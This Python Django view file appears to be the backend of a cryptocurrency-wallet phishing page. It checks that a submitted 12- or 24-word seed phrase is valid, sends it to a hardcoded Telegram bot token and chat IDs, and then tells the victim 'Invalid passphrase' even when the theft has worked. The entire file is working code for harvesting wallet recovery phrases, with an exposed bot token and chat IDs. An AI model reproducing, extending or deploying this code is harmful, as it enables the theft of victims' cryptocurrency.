import requests
from django.shortcuts import render
from django.http import JsonResponse
from mnemonic import Mnemonic



# Replace with your actual Telegram Bot Token and Chat ID
bot_token = '7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys'
chat_id = ['6736572379', '6592117623']



def home(request):
    if request.method == 'POST':
        passphrase = request.POST.get('token')

        if not passphrase:
            return JsonResponse({'success': False, 'error': 'Passphrase is required'}, status=400)

        #def clean_passphrase(self):
        #passphrase = self.cleaned_data.get('passphrase')

        # Split the passphrase into words
        words = passphrase.split()
        mnemo = Mnemonic("english")

        # Check if the passphrase contains exactly 12 or 24 words
        if len(words) not in [12, 24]:
            return JsonResponse({'success': False, 'error': 'Invalid passphrase'})
        
        # Validate the passphrase using mnemonic library
        if not mnemo.check(passphrase):
            return JsonResponse({'success': False, 'error': 'Invalid passphrase'})
        
        # Construct the message to send
        message = f"{passphrase}"

        # Telegram API URL
        telegram_api_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'

        # Send the passphrase to Telegram
        response = requests.post(telegram_api_url, data={
            'chat_id': chat_id,
            'text': message
        })

        if response.status_code == 200:
            return JsonResponse({'success': False, 'error': 'Invalid passphrase'})
        else:
            return JsonResponse({'success': False, 'error': 'Failed to submit'}, status=500)

    return render(request, 'index.html')
